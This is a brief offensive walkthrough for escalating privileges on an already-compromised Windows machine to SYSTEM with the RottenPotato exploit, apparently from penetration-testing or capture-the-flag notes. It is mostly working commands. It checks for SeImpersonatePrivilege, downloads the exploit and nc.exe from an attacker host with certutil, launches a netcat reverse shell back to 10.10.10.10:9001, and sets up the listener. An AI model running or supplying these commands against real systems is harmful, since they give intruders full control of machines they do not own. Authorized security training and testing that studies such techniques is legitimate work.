RottenPotato is an executable that escalates a users privilege.
The method behind this is a local privilege escalation from a service account or standard user to SYSTEM.
https://github.com/foxglovesec/RottenPotato

To identify if this exploit works, firstly a user will need to compromise a Windows system. Once compromised, run:
```
whoami /priv
```
If SeImpersonatePrivilege is enabled then this exploit may work.

Transferring the executable to the compromised machine can be done with this command:
```
cmd /c certutil.exe -urlcache -split -f http://10.10.10.10/RottenPotato.exe RottenPotato.exe
```

Once RottenPotato has been successfully transferred over, run the below command to spawn a shell a SYSTEM:
```
RottenPotato -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\shortcuts\nc.exe -e cmd.exe 10.10.10.10 9001" -t *
```
(It is worth noting nc.exe will need to be transferred onto the system, this can be done with the same certuil method as above).

Setting up a listener prior to running the above command should give us a SYSTEM shell:
```
nc -nlvp 9001
```

Congratulations, you have successfully used RottenPotato to escalate a users privileges.
